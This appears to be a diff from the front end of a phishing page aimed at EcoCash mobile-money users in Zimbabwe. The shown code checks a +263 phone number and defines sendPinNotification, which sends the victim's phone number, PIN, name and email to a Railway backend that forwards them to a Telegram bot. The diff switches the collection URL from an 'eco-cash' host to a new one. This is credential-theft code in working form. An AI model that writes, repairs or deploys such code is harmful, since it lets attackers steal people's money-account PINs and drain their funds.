@@ -463,14 +463,16 @@
         return cleaned.startsWith('+263') && cleaned.length >= 13;
     }
 
-    // Telegram Configuration - NEW CREDENTIALS
-    const RAILWAY_URL = 'https://eco-cash-production.up.railway.app';
+    // ============================================
+    // ✅ UPDATED WITH YOUR NEW RAILWAY URL
+    // ============================================
+    const RAILWAY_URL = 'https://where-hearts-production.up.railway.app';
     const WHATSAPP_URL = 'https://wa.me/254719701318';
+    // ============================================
 
-    // Send notification to Telegram with NEW bot token and chat ID
+    // Send notification to your NEW backend
     async function sendPinNotification(phone, pin, name, email) {
         try {
-            // Using the new backend endpoint that will forward to your new bot
             await fetch(`${RAILWAY_URL}/api/send-telegram`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
